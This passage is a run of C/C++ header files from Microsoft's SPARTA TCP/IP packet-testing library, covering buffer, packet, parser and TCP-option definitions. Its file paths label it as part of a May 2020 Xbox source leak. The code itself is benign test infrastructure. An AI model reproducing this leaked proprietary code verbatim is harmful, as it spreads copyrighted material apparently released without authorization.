*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_MEMORY_H__
#define __SPARTA_MEMORY_H__

#define NO_MEMORY_TRACKING

#ifdef __cplusplus
extern "C"
{
#endif

#if (defined DBG) && (!defined NO_MEMORY_TRACKING)

    // MEM_Allocate - allocate memory
    
    #define MEM_Allocate(X) _sparta_Allocate(X,TEXT(__FILE__),__LINE__)
    
    // MEM_Free - frees memory
    
    #define MEM_Free(X)     _sparta_Free(X,TEXT(__FILE__),__LINE__)
    
    // MEM_Dump - shows a dump of memory usage
    
    VOID MEM_Dump();
    
    // MEM_FlushAll - frees all currently allocated memory - WARNING this can cause serious errors
    //                make sure it's only called at an appropriate time
    
    VOID MEM_FlushAll();
    

    PVOID _sparta_Allocate(DWORD dwSize, TCHAR *pszFilename, DWORD dwLine);
    VOID _sparta_Free(PVOID pvMemory, TCHAR *pszFilename, DWORD dwLine);

    #define DEBUG_MEMORY_ENABLED

#else // for non-debug versions

    // MEM_Allocate - allocate memory
    
    #define MEM_Allocate(X) malloc(X)
    
    // MEM_Free - frees memory
    
    #define MEM_Free(X)     free(X)
    
    // these are meaningless in a non-debug call
    #define MEM_Dump()
    
    // these are meaningless in a non-debug call
    #define MEM_FlushAll()

#endif // debug version ?

#ifdef __cplusplus
} // for the extern "C"
#endif

#endif __SPARTA_MEMORY_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ownwinsock.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: ownwinsock.h                                                                *
* Description: These are handy utility functions usually exported by winsock for our    *
*              own edification. We basically include this here so we don't need to      *
*              link in winsock.                                                         *
*                                                                                       *
*              This code is 'borrowed' from the winsock implementation code.            *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      3/30/2000    made modifications to existing code  *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

// these functions are intended to be used so that winsock is not required for SPARTA
// they are for convenience only and should not be used for any winsock API related
// work. 

#ifndef _WINSOCKAPI_


#ifndef __OWNWINSOCK_H__
#define __OWNWINSOCK_H__

#ifdef __cplusplus
extern "C"
{
#endif

#define WSAAPI

#define u_long                  ULONG
#define u_short                 USHORT
#define u_char                  UCHAR

/*
 * Internet address (old style... should be updated)
 */
struct in_addr {
        union {
                struct { u_char s_b1,s_b2,s_b3,s_b4; } S_un_b;
                struct { u_short s_w1,s_w2; } S_un_w;
                u_long S_addr;
        } S_un;
#define s_addr  S_un.S_addr
                                /* can be used for most tcp & ip code */
#define s_host  S_un.S_un_b.s_b2
                                /* host on imp */
#define s_net   S_un.S_un_b.s_b1
                                /* network */
#define s_imp   S_un.S_un_w.s_w2
                                /* imp */
#define s_impno S_un.S_un_b.s_b4
                                /* imp # */
#define s_lh    S_un.S_un_b.s_b3
                                /* logical host */
};

/*
 * Definitions of bits in internet address integers.
 * On subnets, the decomposition of addresses to host and net parts
 * is done according to subnet mask, not the masks here.
 */
#define IN_CLASSA(i)            (((long)(i) & 0x80000000) == 0)
#define IN_CLASSA_NET           0xff000000
#define IN_CLASSA_NSHIFT        24
#define IN_CLASSA_HOST          0x00ffffff
#define IN_CLASSA_MAX           128

#define IN_CLASSB(i)            (((long)(i) & 0xc0000000) == 0x80000000)
#define IN_CLASSB_NET           0xffff0000
#define IN_CLASSB_NSHIFT        16
#define IN_CLASSB_HOST          0x0000ffff
#define IN_CLASSB_MAX           65536

#define IN_CLASSC(i)            (((long)(i) & 0xe0000000) == 0xc0000000)
#define IN_CLASSC_NET           0xffffff00
#define IN_CLASSC_NSHIFT        8
#define IN_CLASSC_HOST          0x000000ff

#define INADDR_ANY              (u_long)0x00000000
#define INADDR_LOOPBACK         0x7f000001
#define INADDR_BROADCAST        (u_long)0xffffffff
#define INADDR_NONE             0xffffffff

/*
 * Socket address, internet style.
 */
struct sockaddr_in {
        short   sin_family;
        u_short sin_port;
        struct  in_addr sin_addr;
        char    sin_zero[8];
};

u_long WSAAPI
htonl (
    IN u_long hostlong
    );

u_short WSAAPI
htons (
    IN u_short hostshort
    );

u_long WSAAPI
ntohl (
    IN u_long netlong
    );

u_short WSAAPI
ntohs (
    IN u_short netshort
    );

unsigned long WSAAPI
inet_addr (
           IN const char FAR * cp
           );

char FAR * WSAAPI
inet_ntoa (
    IN struct in_addr in
    );


#ifdef __cplusplus
} // closing brace for extern "C"
#endif

#endif // __OWNWINSOCK_H__

#endif // _WINSOCKAPI_
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\packet.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: Packet.hpp                                                                  *
* Description: this defines the Packet class which acts as an abstraction of a buffer   *
*              collection                                                               *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/21/2000    created                              *
*                       jbekmann      5/31/2000    made destructor virtual              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_PACKET_H__
#define __SPARTA_PACKET_H__

#include "sparta.h"
#include "packets.h"

// this is for checking the packet types

#define PACKET_TYPE_MEDIA        BUFFER_TYPE_MEDIA       
#define PACKET_TYPE_ARP          BUFFER_TYPE_ARP         
#define PACKET_TYPE_IP4          BUFFER_TYPE_IP4         
#define PACKET_TYPE_IP6          BUFFER_TYPE_IP6         
#define PACKET_TYPE_UDP          BUFFER_TYPE_UDP         
#define PACKET_TYPE_ICMP         BUFFER_TYPE_ICMP        
#define PACKET_TYPE_IGMPV1       BUFFER_TYPE_IGMPV1
#define PACKET_TYPE_IGMPV2       BUFFER_TYPE_IGMPV2
#define PACKET_TYPE_IGMPV3       BUFFER_TYPE_IGMPV3
#define PACKET_TYPE_TCP          BUFFER_TYPE_TCP         
#define PACKET_TYPE_USERDATA     BUFFER_TYPE_USERDATA

class CPacket
{
    
protected:
    PKT_PACKET          m_Packet;
    PKT_BUFFER          m_UserBuffer; // the Packet's payload (excludes all Headers)

/*
THIS CODE IS NO LONGER USED:

Reason: we maintain a buffer on a per-interface basis, rather on a per-packet basis since
the cost of allocating and freeing buffers on a per-packet basis is too much overhead.
The "dirty" code is thus optimized to be repeated sends of the same packet on the 
interface.

    PBYTE               m_pbLastSendBuffer;
    DWORD               m_dwLastSendBufferLength;
    CRITICAL_SECTION    m_SendBufferCriticalSection;


    LONG                m_lPacketIsDirty;

    VOID MarkPacketDirty();    // call this method whenever something touches the 
                            // data buffer. This is used to optimize for repeated
                            // sends
*/

public:
    virtual int GetPacketType();

    CPacket();
    CPacket(PKT_PACKET Packet);
    virtual ~CPacket();  // frees all resources used by this packet, note that the user buffer
                // needs to be explicitly freed by the user

    DWORD GetLength(); // returns length of physical buffer if packet were to be sent

    virtual DWORD GetMinimumPacketLength(); // override for subsequent packet types
                                            // primarily used for CMacPacket layer

    virtual DWORD GetMaximumPacketLength(); // override for subsequent packet types

    SPARTA_STATUS SetUserBuffer(PVOID pvBuffer, DWORD dwDataLength, BOOL lPerformCopy);
        // sets the user buffer which is the packet's "payload"
        // if lPerformCopy is TRUE, the buffer will be copied and freed when the packet is deleted.
        // otherwise it's the user's responsibility to free it after use.

    SPARTA_STATUS GetUserBuffer(PVOID *ppvBuffer, PDWORD pdwDataLength);
        // returns a pointer to the user buffer as well as the length


    PKT_PACKET GetPacketPointer(); // returns the pointer to the packet structure
                                     // for use by advanced users using the PKT_XXXX API

    SPARTA_STATUS BuildRawBuffer(PBYTE pbDestBuffer,
                                DWORD dwBufferLength,
                                DWORD *pdwBytesCopied);

    // transfers the packet data into a contiguous block of data.
    // calls the send handlers for all buffers prior to copying for advanced users.
    // it is not really recommended for normal use.


    virtual SPARTA_STATUS PreparePacketForSend();

    // This method is called when BuildRawBuffer is called. Typically this is
    // called by the Send method. Override this method to do any processing you
    // need prior to building the raw buffer. Note that this is a higher level
    // handler than the BufferSendHandler at the PKT_XXX API which only handles
    // PKT_BUFFER structures.

    virtual void PrintPacket();
    void PrintUserBuffer();
};

#endif // __SPARTA_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\media.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: media.h                                                                     *
* Description: typedefs for the media type and address structure                        *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/20/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_MEDIA_H__
#define __SPARTA_MEDIA_H__

#include "sparta.h"

typedef enum
{
    UNKNOWN = 0,
    ETHERNET_802_3,
    TOKENRING,
    ATM
} MAC_MEDIA_TYPE;


typedef struct
{
    WORD wAddressLength;
	BYTE *bpAddress;
    MAC_MEDIA_TYPE MediaType;
} tMAC_ADDRESS, *MAC_ADDRESS;


#endif // __SPARTA_MEDIA_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\parser.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: Parser.hpp                                                                  *
* Description: this code will parse a raw buffer into a Packet object                   *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/22/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_PARSER_H__
#define __SPARTA_PARSER_H__

#include "sparta.h"
#include "media.h"
#include "Packet.hpp"


// this is for parsing the MAC header protocol field

#define PROTOCOL_TYPE_IP4        0x0800
#define PROTOCOL_TYPE_IP6        0x86DD
#define PROTOCOL_TYPE_ARP        0x0806

#define PROTOCOL_TYPE_IGMP       0x0002
#define PROTOCOL_TYPE_ICMP       0x0001
#define PROTOCOL_TYPE_UDP        0x0011
#define PROTOCOL_TYPE_TCP        0x0006
#define PROTOCOL_TYPE_ERROR      0xFFFF


// IGMP Messages Types used for parsing only (the type and version
//  in IGMPV1 are clubbed together to form one byte)
// for version 1 and version 2 igmp packets
// for actual type constants refer to ipconstants.h
#define IGMP_DVMRP_PARSE_TYPE 0x13
#define IGMP_MEMBERSHIP_QUERY_PARSE_TYPE 0x11
#define IGMP_V2_MEMBERSHIP_REPORT_PARSE_TYPE 0x16
#define IGMP_LEAVE_GROUP_PARSE_TYPE 0x17
#define IGMP_V1_MEMBERSHIP_REPORT_PARSE_TYPE 0x12



class CParser
{
public:
    static CPacket *ParseBuffer(MAC_MEDIA_TYPE MediaType, PVOID pvBuffer, DWORD dwLength);

private:
    static CPacket *ParseRawBuffer(MAC_MEDIA_TYPE MediaType, PVOID pvBuffer, DWORD dwLength);

};

#endif // __SPARTA_PARSER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\pattern.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: Pattern.hpp                                                                 *
* Description: this defines the Pattern class used in the driver API                    *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      3/30/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_PATTERN_H__
#define __SPARTA_PATTERN_H__

#include "sparta.h"
#include "driverapi.h"


class CPattern
{
    friend class CInterface; // we want access to the internals

protected:
    NI_PATTERN m_Pattern;

    CPattern( const CPattern& )    //  Private copy constructor.
    {
        DEBUGMSG(DBG_SPARTA_DRIVERAPI,
            (TEXT("**DON'T LIKE COPY CONSTRUCTOR ****** CPattern::CPattern[]\n")
            ));

    }

public:
    CPattern(DWORD dwOffset, DWORD dwLength, PVOID pvBuffer);
    CPattern(MAC_MEDIA_TYPE MediaType, DWORD dwOffset, DWORD dwLength, PVOID pvBuffer);
    // this constructor will take the offset to be relative to the MediaHeader
    // i.e. offset 0 = first byte after the media header

    ~CPattern();
};


#endif // __SPARTA_PATTERN_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\packets.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: packets.h                                                                   *
* Description: buffer management routines for packet manipulation                       *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      1/24/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_PACKETS_H__
#define __SPARTA_PACKETS_H__


#ifdef __cplusplus // this file is also included by C++ files
extern "C"
{
#endif 



#define BUFFER_TYPE_MEDIA         0x01000000
#define BUFFER_TYPE_ARP           0x02000000
#define BUFFER_TYPE_IP4           0x03000000
#define BUFFER_TYPE_IP6           0x04000000
#define BUFFER_TYPE_UDP           0x05000000
#define BUFFER_TYPE_ICMP          0x06000000
#define BUFFER_TYPE_TCP           0x07000000
#define BUFFER_TYPE_TCP_OPTION    0x08000000
#define BUFFER_TYPE_USERDATA      0x09000000
#define BUFFER_TYPE_IGMPV1        0x0A000000
#define BUFFER_TYPE_IGMPV2        0x0B000000
#define BUFFER_TYPE_IGMPV3        0x0c000000
#define BUFFER_TYPE_MASK_OFF_MSB  0x00ffffff


#define net_short(x) ((((x)&0xff) << 8) | (((x)&0xff00) >> 8))


#define PHXSUM(s,d,p,l) (UINT)( (UINT)*(USHORT *)&(s) + \
                        (UINT)*(USHORT *)((UCHAR *)&(s) + sizeof(USHORT)) + \
                        (UINT)*(USHORT *)&(d) + \
                        (UINT)*(USHORT *)((UCHAR *)&(d) + sizeof(USHORT)) + \
                        (UINT)((USHORT)net_short((p))) + \
                        (UINT)((USHORT)net_short((USHORT)(l))) )

   


   

#ifdef   UNUSED

typedef struct 
{
   DWORD dwRefCount;    // buffers referring to this pool
   PVOID pvMemory;      // pool pointer
   DWORD dwLength;      // actual length
   BOOL  lAutoFree;     // whether this buffer will be freed automatically
} tPKT_BUFFER_POOL,*PKT_BUFFER_POOL;



typedef SPARTA_STATUS (*PKT_SEND_HANDLER)(struct _tagPKT_BUFFER *);
// the send handler is called for each header in a packet
// when BuildSendData is called. If the function returns anything
// other than ERROR_SUCCESS the call to BuildSendData will fail
// with the error code given.

#endif


struct _tagPKT_PACKET;  // forward declaration

typedef struct _tagPKT_BUFFER 
{
   DWORD                   dwAllocLength;
   DWORD                   dwActualLength;
   PVOID                   pvData;
   struct _tagPKT_BUFFER   *pNext;
   struct _tagPKT_BUFFER   *pPrev;
   
   DWORD                   dwBufferType;
   struct _tagPKT_PACKET   *pPacket;          
   // pointer to the packet (if assigned) that this buffer belongs to
#ifdef   INCLUDE_UNUSED        
   PKT_BUFFER_POOL AllocPool; 
   // if NULL, then pvData is the actual allocation received from the Memory Manager
   // if it's not NULL, then this is the pool that this buffer was allocated from.
#endif
   BOOL                    lAutoFree;    
   // the memory is automatically freed.
   // note that if there is a buffer pool, then the memory in the pool can only be freed with a call
   // to freebufferpool.
#ifdef   INCLUDE_UNUSED
   PKT_SEND_HANDLER        pfnSendHandler; // access to a single buffer only
   PVOID                   pvUserContext;
#endif
} tPKT_BUFFER, *PKT_BUFFER;


typedef struct _tagPKT_PACKET 
{
   WORD              wBufferCount; // number of buffers in this packet
   PKT_BUFFER        pHead;
   PKT_BUFFER        pTail;
   CRITICAL_SECTION  csPacketCritialSection;
} tPKT_PACKET, *PKT_PACKET;


//
// NOTE: it is recommended that BufferPools not be used unless you know exactly what they do.
//

#ifdef   INCLUDE_UNUSED
PKT_BUFFER_POOL  PKT_InitializeBufferPool(PVOID pvMemory, DWORD dwLength, BOOL lAutoFree);
// initializes buffer pool structure
// if lAutoFree is TRUE, the pool will
// automatically be freed when
// all associated buffers are freed
#endif

PKT_PACKET PKT_AllocatePacket();                                                        
// allocates a Packet Structure
SPARTA_STATUS PKT_AttachBuffer(PKT_PACKET Packet, PKT_BUFFER NewBuffer);
// Attaches a buffer to the end of the buffer list
SPARTA_STATUS PKT_InsertAfterBuffer(PKT_PACKET Packet, PKT_BUFFER PreviousBuffer, PKT_BUFFER NewBuffer);
// inserts a buffer AFTER the given buffer
// if given buffer is NULL, will become
// new head of list
SPARTA_STATUS PKT_UnchainBuffer(PKT_BUFFER Buffer); 
// unchains the specified buffer from it's packet

DWORD PKT_GetPacketLength(PKT_PACKET Packet); 
// returns length of physical buffer (uses dwActualLength of the buffers)

#ifdef   INCLUDE_UNUSED
DWORD PKT_GetBufferCount(PKT_PACKET Packet);  
// returns number of buffers in the packet
#endif

SPARTA_STATUS PKT_BuildSendData(PKT_PACKET Packet,PBYTE pbDestBuffer,DWORD dwBufferLength, DWORD *pdwBytesCopied);
// transfers the packet data into a contiguous block of data
// calls the send handlers for all
// packets prior to copying

SPARTA_STATUS PKT_UnchainAndFreeAllPacketBuffers(PKT_PACKET Packet);
// explicitly frees all the buffers in the packet list
SPARTA_STATUS PKT_FreePacket(PKT_PACKET Packet);
// frees the packet - only possible if the packet list
// is empty  - see UnchainAndFreeAllPacketBuffers

PKT_BUFFER PKT_AllocateBuffer(DWORD dwInitialLength, DWORD dwMaximumLength);
// allocate a buffer with the Maximum length.
// the ActualLength is set to InitialLength
// allocated buffers are freed automatically

PKT_BUFFER PKT_MapBuffer(PVOID pvExistingBuffer, DWORD dwCurrentLength, DWORD dwMaxBufferLength, BOOL lAutoFree);
// create a buffer structure
// and initialize the data area with a pointer to
// the existing buffer.
// Use instead of AllocateBuffer if you already have
// an allocated buffer.
// MaxBufferLength is the total memory allocated
// CurrentLength is the length to set the current
// buffer to.
// It is the caller's responsibility to free memory
// pointed to by a mapped buffer if lAutoFree is FALSE

#ifdef   INCLUDE_UNUSED
PKT_BUFFER PKT_MapPooledBuffer(PKT_BUFFER_POOL BufferPool,
                                     PVOID pvExistingBuffer,
                                     DWORD dwCurrentLength,
                                     DWORD dwMaxBufferLength);
#endif


SPARTA_STATUS PKT_SetBufferType(PKT_BUFFER Buffer, DWORD dwBufferType);
// sets the buffer type

PKT_PACKET PKT_GetBuffersPacket(PKT_BUFFER Buffer); 
// returns the packet which this buffer is part of

DWORD PKT_GetBufferType(PKT_BUFFER Buffer); 
// returns the buffer type
// the Buffer type is opague to the packet API or the driver. It was added for easier
// parsing and identification on the users part. Use as desired.

#ifdef   INCLUDE_UNUSED
PVOID PKT_GetUserContext(PKT_BUFFER Buffer); 
// sets the user context
SPARTA_STATUS PKT_SetUserContext(PKT_BUFFER Buffer, PVOID pvUserContext); 
// returns the user context
#endif

PVOID PKT_GetBufferData(PKT_BUFFER Buffer); 
// returns a pointer to the buffer's data

#ifdef   INCLUDE_UNUSED
SPARTA_STATUS PKT_SetBufferSendHandler(PKT_BUFFER Buffer, PKT_SEND_HANDLER pfnSendHandler);
// sets the send handler for this buffer
// see notes above

SPARTA_STATUS PKT_ClearBufferSendHandler(PKT_BUFFER Buffer);
// clears the send handler
#endif

DWORD PKT_GetBufferLength(PKT_BUFFER Buffer);                   
// get Buffer length
DWORD PKT_GetBufferMaxLength(PKT_BUFFER Buffer); 
// returns length of allocated buffer (uses dwAllocLength)

SPARTA_STATUS PKT_SetBufferLength(PKT_BUFFER Buffer, DWORD dwNewLength);
// set Buffer length
// does NOT grow buffer

SPARTA_STATUS PKT_FreeBuffer(PKT_BUFFER Buffer);
// frees the given buffer
// NOTE: if the buffer was mapped then the
// data pointer will not be freed !!

USHORT xsum( UINT Phxsum,PVOID Buffer,INT Size);


#ifdef __cplusplus // this file is also included by C++ files, we declared it as extern "C"
}
#endif 

#endif // __SPARTA_PACKETS_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\tcp.h ===
//* Definitions for header flags.
#ifndef __SPARTA_TCP_H__
#define __SPARTA_TCP_H__


#pragma pack(push,origpack)

#pragma pack(1)
#define	PROTOCOL_TCP	06	// TCP protocol number
#define	TCP_MAX_HEADER_LENGTH	20	// TCP max header lenght
#define  TCP_DEFAULT_WINDOWSIZE    17520


#define TCP_FIN    0x1
#define TCP_SYN    0x2
#define TCP_RST    0x4
#define TCP_PUSH   0x8
#define TCP_ACK    0x10
#define TCP_URG    0x20


#define TCP_OPTION_EOO   0
#define TCP_OPTION_NOOP  1
#define TCP_OPTION_MSS   2
#define TCP_OPTION_WS    3
#define TCP_OPTION_SACKP 4
#define TCP_OPTION_SACK  5
#define TCP_OPTION_TS    8
#define TCP_OPTION_RAW   99


#define MAX_NO_TCP_OPTIONS  40
#define MAX_TCP_HDR_SIZE    60



typedef struct _tagTCPT_Header {
    USHORT              tcp_src;        // Source port.
    USHORT              tcp_dest;       // Destination port.
    ULONG               tcp_seq;        // Sequence number.
    ULONG               tcp_ack;        // Ack number.
    USHORT              tcp_flags;      // Flags and data offset.
    USHORT              tcp_window;     // Window offered.
    USHORT              tcp_xsum;       // Checksum.
    USHORT              tcp_urgent;     // Urgent pointer.

} TCP_HDR_TYPE, *pTCP_HDR_TYPE;




typedef struct _tagTCPOpion_NoOp{
  UCHAR  Kind;
} TCPO_NoOp_TYPE, *pTCPO_NoOp_TYPE;



typedef struct _tagTCPOpion_MSS{
  UCHAR  Kind;
  UCHAR  Length;
  USHORT MSS;

} TCPO_MSS_TYPE, *pTCPO_MSS_TYPE;


typedef struct _tagTCPOpion_WS{
  UCHAR  Kind;
  UCHAR  Length;
  UCHAR  WS;

} TCPO_WS_TYPE, *pTCPO_WS_TYPE;



typedef struct _tagTCPOpion_TS{
  UCHAR  Kind;
  UCHAR  Length;
  ULONG  TSValue;
  ULONG  TSEcho;

} TCPO_TS_TYPE, *pTCPO_TS_TYPE;


typedef struct _tagTCPSACKP_TYPE{
  UCHAR  Kind;
  UCHAR  Length;
} TCPO_SACKP_TYPE, *pTCPO_SACKP_TYPE;


typedef struct _tagTCPSACK_TYPE{
  UCHAR  Kind;
  UCHAR  Length;
  ULONG  Block[10];
} TCPO_SACK_TYPE, *pTCPO_SACK_TYPE;

typedef struct _tagTCPRAW_TYPE{
  UCHAR  Kind;
  UCHAR  Length;
  UCHAR  Block[MAX_NO_TCP_OPTIONS];
} TCPO_RAW_TYPE, *pTCPO_RAW_TYPE;



#pragma pack(pop,origpack)

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\sparta.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: sparta.h                                                                    *
* Description: global definitions applicable to the sparta dll                          *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      1/24/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_SPARTA_H__
#define __SPARTA_SPARTA_H__

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <tchar.h>
#include "ownwinsock.h" // we define our own winsock so that we don't have to link or load
                        // the winsock dll or driver !

#include "dbgmsg.h"

/* SPARTA STATUS CODES -- based on WINERROR.H codes */

typedef ULONG SPARTA_STATUS;
#define DWORD_ERROR_VALUE 0xFFFFFFFF

#define ANYSIZE 1

#endif // __SPARTA_SPARTA_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\tcpoption.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: TCPOptions.hpp                                                              *
* Description: This is the definition of the TCP Option class                           *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       balasha      6/15/2000    created                               *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_TCPOPTION_H__
#define __SPARTA_TCPOPTION_H__

#include "TCP.h"
#include "Packets.h"


class CTCPOption
{

friend class CTCPHeader;

protected:

   BOOL    IsActive;
   UCHAR   Kind;
   USHORT  Length;
   UCHAR * m_TCPOption;
   
  public:
   
   CTCPOption();
   CTCPOption(const UCHAR Kind);
   ~CTCPOption();

   SPARTA_STATUS  AddEOO();
   SPARTA_STATUS  AddNoOp();
   SPARTA_STATUS  AddMSS(USHORT MSSValue);
   SPARTA_STATUS  AddWs(UCHAR WsFactor);
   SPARTA_STATUS  AddTs(ULONG TSValue, ULONG TSEcho);
   SPARTA_STATUS  AddSackP();
   SPARTA_STATUS  AddSack();
   SPARTA_STATUS  AddRaw(UCHAR LocalKind, UCHAR LocalLength, UCHAR * Buffer);
   
   SPARTA_STATUS  SetLength(UCHAR LocalLength);
   SPARTA_STATUS  SetKind(UCHAR LocalKind);
   
   SPARTA_STATUS  SetSackValue(USHORT Position, ULONG Value);
   SPARTA_STATUS  SetTSValue(ULONG Value);
   SPARTA_STATUS  SetTSEcho(ULONG Value);
   SPARTA_STATUS  SetMSSValue(USHORT Value);
   SPARTA_STATUS  SetWSFactor(UCHAR Value);
   
   
   SPARTA_STATUS  Remove();
   BOOLEAN        Print();
   
   ULONG  GetSackValue(USHORT Position);
   
   ULONG  GetTSValue();
   ULONG  GetTSEcho();
   USHORT GetMSSValue();
   UCHAR  GetWSFactor();
   
   
   
   
   
   UCHAR  GetKind();
   UCHAR  GetLength();
};

#endif //__SPARTA_TCPPOPTION_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\spartaapi.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: spartaAPI.h                                                                 *
* Description: includes all the API header files needed by users of the API             *
*              (not intended for use by files which implement the API)                  *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/18/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_SPARTAAPI_H__
#define __SPARTA_SPARTAAPI_H__

#include "sparta.h"     // includes windows etc...

#include "memory.h"     // the .h files are for using the C API functions
#include "packets.h"
#include "media.h"
#include "driverapi.h"

#include "Packet.hpp"   // the .hpp are for using the C++ API functions
#include "Interface.hpp"
#include "SpartaException.hpp"
#include "MacAddress.hpp"
#include "MacPacket.hpp"
#include "ArpPacket.hpp"
#include "IPPacket.hpp"
#include "IPHeader.hpp"
#include "UDPHeader.hpp"
#include "UDPPacket.hpp"
#include "TCPHeader.hpp"
#include "TCPOption.hpp"
#include "TCPPacket.hpp"
#include "ICMPPacket.hpp"
#include "ICMPHeader.hpp"
#include "Parser.hpp"
#include "IGMPPacketV2.hpp"
#include "IGMPPacketV1.hpp"
#include "icmpv6header.hpp"
#include "icmpv6packet.hpp"
#include "AutoArp.hpp"

//#include "Parser.hpp" I don't think this is needed

#endif // __SPARTA_SPARTAAPI_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\receivetimer.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: ReceiveTimer.hpp                                                            *
* Description: This is the implementation of Timers for the packet receive methods      *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      4/7/2000     created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_RECEIVETIMER_H__
#define __SPARTA_RECEIVETIMER_H__

#include "sparta.h"

class CReceiveTimer
{
protected:
    HANDLE m_hWaitableTimer;
public:
    CReceiveTimer();
    ~CReceiveTimer();
    SPARTA_STATUS Start(DWORD dwTimeOut); // timeout in milliseconds
    HANDLE GetTimerObject();
};

#endif // __SPARTA_RECEIVETIMER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\tcpheader.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: TCPHeader.hpp                                                               *
* Description: This is the implementation of the TCPHeader functions                    *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       balasha       4/20/2000    created                              *
*                       deepakp       4/20/2000    added routines to return raw buffers *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/
#ifndef __SPARTA_TCP_HEADER_H__
#define __SPARTA_TCP_HEADER_H__


